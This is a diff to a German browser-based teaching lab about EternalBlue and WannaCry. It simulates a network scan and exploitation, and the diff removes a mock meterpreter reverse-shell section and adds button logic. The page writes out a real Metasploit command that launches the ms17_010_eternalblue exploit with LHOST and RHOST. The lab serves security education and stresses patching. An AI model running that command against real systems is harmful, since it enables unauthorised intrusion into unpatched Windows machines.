@@ -34,8 +34,8 @@
             margin-bottom: 20px;
         }
         .btn {
-            display: block;
-            margin: 10px auto;
+            display: inline-block;
+            margin: 10px 5px;
             padding: 10px 20px;
             background: #007bff;
             color: #fff;
@@ -46,6 +46,10 @@
         }
         .btn:hover {
             background: #0056b3;
+        }
+        .btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
         }
         .hidden {
             display: none;
@@ -60,46 +64,44 @@
 </head>
 <body>
     <div class="container">
-    <h1>Patch-Lab: Blue und WannaCry</h1>
-<p>
-    Im Jahr 2017 führte die Sicherheitslücke <strong>EternalBlue</strong> im SMBv1-Protokoll (Server Message Block, ein Netzwerkprotokoll für Datei- und Druckerfreigaben) 
-    dazu, dass die Ransomware <strong>WannaCry</strong> weltweit ungepatchte Systeme angreifen konnte. Innerhalb weniger Stunden wurden Millionen Computer infiziert, 
-    Daten verschlüsselt und Lösegeldforderungen gestellt. Dies hätte durch regelmäßige Sicherheitsupdates verhindert werden können.
-</p>
-<p>
-    Dieses Lab zeigt in einer sicheren, simulierten Umgebung, wie solche Angriffe auf ungepatchte Systeme ablaufen können und warum 
-    Sicherheitsupdates so entscheidend sind. Du wirst lernen:
-</p>
-<ul>
-    <li>Wie Sicherheitslücken wie EternalBlue durch Netzwerkscans entdeckt werden können.</li>
-    <li>Wie Angreifer diese Schwachstellen ausnutzen, um sich Zugriff auf Systeme zu verschaffen.</li>
-    <li>Welche Schritte notwendig sind, um dich und deine Geräte gegen solche Bedrohungen zu schützen.</li>
-</ul>
-<p>
-    Ziel dieses Labs ist es, dir ein besseres Verständnis für die Bedeutung von regelmäßigen Updates zu geben und zu zeigen, wie schnell 
-    Angreifer ungepatchte Systeme ausnutzen können. Die Simulation wird dabei in drei Schritten durchgeführt:
-</p>
-<ol>
-    <li>Ein Netzwerkscan, um potenziell gefährdete Systeme im Netzwerk zu identifizieren.</li>
-    <li>Ein Exploit, der die Schwachstelle eines ungepatchten Systems ausnutzt.</li>
-    <li>Eine Demonstration, wie Angreifer Zugriff auf sensible Daten erlangen könnten.</li>
-</ol>
-<p>
-    Durch diese Simulationen sollst du nicht nur verstehen, wie Angriffe ablaufen, sondern auch, wie du solche Bedrohungen mit einfachen Maßnahmen, 
-    wie z. B. dem Einspielen von Sicherheitsupdates, verhindern kannst.
-</p>
-
+        <h1>Patch-Lab: Blue und WannaCry</h1>
+        <p>
+            Im Jahr 2017 führte die Sicherheitslücke <strong>EternalBlue</strong> im SMBv1-Protokoll (Server Message Block, ein Netzwerkprotokoll für Datei- und Druckerfreigaben)
+            dazu, dass die Ransomware <strong>WannaCry</strong> weltweit ungepatchte Systeme angreifen konnte. Innerhalb weniger Stunden wurden Millionen Computer infiziert,
+            Daten verschlüsselt und Lösegeldforderungen gestellt. Dies hätte durch regelmäßige Sicherheitsupdates verhindert werden können.
+        </p>
+        <p>
+            Dieses Lab zeigt in einer sicheren Umgebung, wie solche Angriffe auf ungepatchte Systeme ablaufen können und warum
+            Sicherheitsupdates so entscheidend sind. Du wirst lernen:
+        </p>
+        <ul>
+            <li>Wie Sicherheitslücken wie EternalBlue durch Netzwerkscans entdeckt werden können.</li>
+            <li>Wie Angreifer diese Schwachstellen ausnutzen, um sich Zugriff auf Systeme zu verschaffen.</li>
+            <li>Welche Schritte notwendig sind, um dich und deine Geräte gegen solche Bedrohungen zu schützen.</li>
+        </ul>
+        <p>
+            Ziel dieses Labs ist es, dir ein besseres Verständnis für die Bedeutung von regelmäßigen Updates zu geben und zu zeigen, wie schnell
+            Angreifer ungepatchte Systeme ausnutzen können. Die Simulation wird dabei in drei Schritten durchgeführt:
+        </p>
+        <ol>
+            <li>Ein Netzwerkscan, um potenziell gefährdete Systeme im Netzwerk zu identifizieren.</li>
+            <li>Ein Exploit, der die Schwachstelle eines ungepatchten Systems ausnutzt.</li>
+            <li>Eine Demonstration, wie Angreifer Zugriff auf sensible Daten erlangen könnten.</li>
+        </ol>
+        <p>
+            Durch diese Simulationen sollst du nicht nur verstehen, wie Angriffe ablaufen, sondern auch, wie du solche Bedrohungen mit einfachen Maßnahmen,
+            wie z. B. dem Einspielen von Sicherheitsupdates, verhindern kannst.
+        </p>
 
         <h2>Schritt 1: Netzwerkscan mit Nmap</h2>
-    <p>
-    Führe einen Netzwerkscan durch, um herauszufinden, welche Geräte im Netzwerk erreichbar sind. Der Scan zeigt offene Ports (wie Port 445 für SMB) und das Betriebssystem an. 
-    Angreifbare Systeme haben ungepatchte Sicherheitslücken, die in einem späteren Schritt ausgenutzt werden können.
-</p>
-<p>
-    Für solche Scans wird häufig ein Tool wie <strong>nmap</strong> verwendet, das gezielt Informationen über Geräte und ihre Schwachstellen im Netzwerk sammeln kann. 
-    Es ist jedoch wichtig zu beachten, dass der Einsatz von nmap auf fremden IP-Adressen ohne ausdrückliche Genehmigung <strong>illegal</strong> ist und rechtliche Konsequenzen haben kann. 
-    In diesem Lab wird die Funktionsweise von nmap in einer sicheren, simulierten Umgebung gezeigt.
-</p>
+        <p>
+            Führe einen Netzwerkscan durch, um herauszufinden, welche Geräte im Netzwerk erreichbar sind. Ziel ist es, ein anfälliges System zu identifizieren.
+        </p>
+        <p>
+            Für solche Scans wird häufig ein Tool wie <strong>nmap</strong> verwendet, das gezielt Informationen über Geräte und ihre Schwachstellen im Netzwerk sammeln kann.
+            Es ist jedoch wichtig zu beachten, dass der Einsatz von nmap auf fremden IP-Adressen ohne ausdrückliche Genehmigung <strong>illegal</strong> ist und rechtliche Konsequenzen haben kann.
+            In diesem Lab wird die Funktionsweise von nmap in einer sicheren, simulierten Umgebung gezeigt.
+        </p>
 
         <pre>
 LHOST=192.168.1.100
@@ -107,16 +109,15 @@ Ziel IP-Adresse 1=192.168.1.10
 Ziel IP-Adresse 2=192.168.1.20
         </pre>
         <div id="step-1" class="step">
-            <button class="btn" onclick="scanIP('RHOST1')">Scan für Ziel IP-Adresse 1 starten</button>
-            <button class="btn" onclick="scanIP('RHOST2')">Scan für Ziel IP-Adresse 2 starten</button>
+            <button class="btn" id="scan-rhost1" onclick="scanIP('RHOST1')">Scan für Ziel IP-Adresse 1 starten</button>
+            <button class="btn" id="scan-rhost2" onclick="scanIP('RHOST2')">Scan für Ziel IP-Adresse 2 starten</button>
             <div class="console" id="console-1"></div>
         </div>
 
         <div id="step-2" class="hidden">
             <h2>Schritt 2: Exploit vorbereiten</h2>
             <p>
-                Jetzt greifen wir das anfällige System an. Hierfür nutzen wir den Exploit <strong>ms17_010_eternalblue</strong>, 
-                der die SMB-Sicherheitslücke ausnutzt. Gib den folgenden Befehl ein und ersetze <code>[RHOST]</code> mit der IP des angreifbaren Systems:
+                Jetzt greifen wir das anfällige System an. Gib den folgenden Befehl ein und ersetze <code>[RHOST]</code> mit der IP des angreifbaren Systems:
             </p>
             <pre>
 msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set LHOST 192.168.1.100; set RHOST [RHOST]; run"
@@ -127,32 +128,6 @@ msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set LHOST 192.168.1
             </div>
             <div class="console" id="console-2"></div>
         </div>
-
-        <div id="step-3" class="hidden">
-            <h2>Schritt 3: Reverse Shell und Zugang</h2>
-            <p>
-                Nach erfolgreichem Angriff haben wir Zugriff auf das Zielsystem. Dies geschieht über eine sogenannte <strong>Reverse Shell</strong>, 
-                bei der sich das Zielsystem mit unserem Computer verbindet. So können wir Befehle ausführen, Dateien durchsuchen und sensible Informationen auslesen.
-            </p>
-            <div class="console">
-                <p>meterpreter > ls</p>
-                <p> Directory of C:\Users\Victim\Desktop</p>
-                <p> flag.txt</p>
-                <p> confidential.docx</p>
-                <p>meterpreter > cd Desktop</p>
-                <p>meterpreter > cat flag.txt</p>
-                <p style="color: green;">Flag: {PATCH_THE_PATCH}</p>
-            </div>
-            <a href="index.html" class="btn">Zurück zum Hauptmenü</a>
-        </div>
-
-        <h2>Ausblick: Keine Patches mehr für Windows 10?</h2>
-        <p>
-            Wenn Sicherheitsupdates für Windows 10 eingestellt werden, könnten ähnliche Szenarien auftreten wie bei WannaCry. 
-            Angreifer könnten ungepatchte Schwachstellen finden und ausnutzen. Besonders kritisch sind Protokolle wie SMB, die von vielen Geräten verwendet werden.
-            Um dies zu verhindern, sollten Systeme auf ein aktuelles Betriebssystem aktualisiert oder vom Internet getrennt werden, 
-            sobald der Support endet.
-        </p>
     </div>
 
     <script>
@@ -160,6 +135,8 @@ msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set LHOST 192.168.1
 
         function scanIP(target) {
             const console1 = document.getElementById("console-1");
+            const button = document.getElementById(target === "RHOST1" ? "scan-rhost1" : "scan-rhost2");
+
             if (scanResults[target]) {
                 console1.innerHTML += `Scan für ${target} wurde bereits durchgeführt.\n`;
                 return;
@@ -173,13 +150,15 @@ msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set LHOST 192.168.1
                     console1.innerHTML += "192.168.1.20 - Windows 7 (ungepatcht, anfällig)\nOffene Ports: 80, 445 (SMB), 3389\n";
                 }
                 scanResults[target] = true;
-            }, 2000);
-            setTimeout(() => {
+
+                // Deaktiviere den Button nach Scan
+                button.disabled = true;
+
+                // Öffne Schritt 2 nur bei RHOST2
                 if (target === "RHOST2") {
-                    document.getElementById("step-1").classList.add("hidden");
                     document.getElementById("step-2").classList.remove("hidden");
                 }
-            }, 4000);
+            }, 2000);
         }
 
         function checkExploit() {
@@ -191,10 +170,6 @@ msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set LHOST 192.168.1
                 console2.innerHTML = "Starte Exploit...\n";
                 setTimeout(() => {
                     console2.innerHTML += "Exploit erfolgreich. Verbindung mit dem Ziel hergestellt.\n";
-                    setTimeout(() => {
-                        document.getElementById("step-2").classList.add("hidden");
-                        document.getElementById("step-3").classList.remove("hidden");
-                    }, 2000);
                 }, 3000);
             } else {
                 console2.innerHTML = "Ungültiger Befehl! Überprüfe die Syntax und versuche es erneut.";
